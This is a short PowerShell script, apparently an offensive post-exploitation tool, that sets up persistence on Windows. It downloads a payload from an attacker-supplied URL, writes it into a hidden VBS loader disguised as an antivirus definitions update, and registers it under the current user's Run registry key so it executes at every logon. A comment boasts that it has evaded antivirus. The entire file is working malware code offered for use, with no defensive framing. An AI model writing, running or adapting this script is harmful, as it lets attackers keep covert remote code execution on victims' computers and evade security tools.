function Add-Persistence()
{
	param
	(
		[parameter(Mandatory=$true)]
		[string]
		$payloadurl
	)
	
	# Default saving the payload to the %TEMP% directory
	$tmpdir = $env:APPDATA
	
	# Change this if desired.
	$payloadvbsloaderpath = "$tmpdir\update-avdefs.vbs"

	# Download and verify the payload.
	Write-Host "[+] Downloading payload $payloadurl"
	$payload = (New-Object Net.WebClient).DownloadString($payloadurl)
	
	$payloadlength = $payload.Length
	if ($payloadlength -gt 0) 
		{ Write-Host "[+] Payload length: $payloadlength bytes" }
	else
	{ 
		Write-Host "[!] Payload length: 0 characters. Is the web server up?"
		return
	}
	
	# Create the VBS file and insert the powershell command from unicorn.
	Write-Host "[+] Creating VBS loader."
	$vbs = "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
	$vbs += "ps = ""$payload""`r`n"
	$vbs += "oShell.run(ps),0,true"
	$vbs | Out-File $payloadvbsloaderpath -Force
	
	# Mark the file as hidden.
	Write-Host "[+] Marking $payloadvbsloaderpath as Hidden."
	$fileObj = get-item $payloadvbsloaderpath -Force
	$fileObj.Attributes="Hidden"
	
	# Set the LOAD key. Haven't been caught by AV yet. ;-)
	Write-Host "[+] Updating registry with a LOAD key"
	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name UPDATE -Value $payloadvbsloaderpath

	Write-Host "[+] Done!"
}

Add-Persistence
